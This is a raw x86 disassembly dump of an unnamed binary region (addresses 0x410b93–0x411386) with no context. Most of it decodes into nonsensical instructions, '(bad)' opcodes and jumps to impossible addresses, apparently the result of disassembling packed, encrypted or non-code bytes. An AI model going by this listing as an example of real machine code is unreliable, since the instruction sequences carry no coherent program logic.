  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
